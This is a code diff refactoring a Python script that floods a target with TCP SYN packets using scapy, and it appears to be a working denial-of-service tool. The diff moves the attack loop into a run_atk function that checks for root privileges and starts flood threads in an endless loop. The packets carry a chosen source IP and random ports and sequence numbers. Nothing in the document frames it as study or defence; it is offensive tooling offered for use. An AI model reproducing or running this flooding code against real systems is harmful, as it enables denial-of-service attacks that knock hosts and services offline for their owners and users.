@@ -1,10 +1,7 @@
 #!/usr/bin/python3
 
 import argparse
-import random
-import sys
-from threading import *
-
+from random import randint
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 
@@ -31,10 +28,12 @@ class Flooder(Thread):
 
     def build_packet(self):
         dest_port = 80
-        src_port = random.randint(1025, 65535)
-        sequence = random.randint(1000, 100000)
+        src_port = randint(1025, 65535)
+        sequence = randint(1000, 100000)
+
         opt = [("MSS", 65495), ("SAckOK", b''), ('Timestamp', (4294693388, 0)), ("NOP", None), ("WScale", 10)]
         window = 65495
+
         ip = IP(src=self.ip, dst=self.target)
         tcp = TCP(sport=src_port, dport=dest_port, flags="S", window=window, seq=sequence, options=opt)
         packet = ip / tcp
@@ -46,9 +45,42 @@ class Flooder(Thread):
 
         try:
             send(packet, verbose=False)
-        # send(packet,verbose=False)
+
         except KeyboardInterrupt:
             print("Operation interrupted by user...")
+            sys.exit(0)
+
+
+def run_atk(destination_ip, port, source_ip, num_thread):
+    """
+    TODO Check unused port
+    :param destination_ip:
+    :param source_ip:
+    :param port:
+    :param num_thread:
+    :return:
+    """
+    # Check for the right permissions to run the code
+    uid = os.getuid()
+    if uid == 0:
+        print("[*] Permissions look good.")
+        time.sleep(0.5)
+    else:
+        print('[-] Not enough permissions to run this script. Try with sudo...')
+        sys.exit(1)
+
+    target_port = port
+
+    print('[*] Started SYN Flood on: {}'.format(destination_ip))
+    while True:
+        try:
+            for x in range(0, num_thread):
+                thread = Flooder(destination_ip, source_ip)
+                thread.setDaemon(True)
+                thread.start()
+                thread.join()
+        except KeyboardInterrupt:
+            print('[-] Canceled by user...')
             sys.exit(0)
 
 
@@ -61,34 +93,12 @@ def main():
 
     args = parser.parse_args()
 
-    if not len(sys.argv[1:]):
+    if not len(sys.argv[1:]) or args.threads.isdigit() is False:
         usage()
 
-    uid = os.getuid()
-    if uid == 0:
-        print("[*] Permissions look good.")
-        time.sleep(0.5)
-    else:
-        print('[-] Not enough permissions to run this script. Try with sudo...')
-        sys.exit(1)
+    # TODO Add more checks
 
-    target = args.destination
-    target_port = int(args.port)
-    ip = args.source
-
-    threads = []
-    print('[*] Started SYN Flood on: {}'.format(target))
-    while True:
-        try:
-            threads = int(args.threads)
-            for x in range(0, threads):
-                thread = Flooder(target, ip)
-                thread.setDaemon(True)
-                thread.start()
-                thread.join()
-        except KeyboardInterrupt:
-            print('[-] Canceled by user...')
-            sys.exit(0)
+    run_atk(args.destination, int(args.port), args.source, int(args.threads))
 
 
 if __name__ == "__main__":
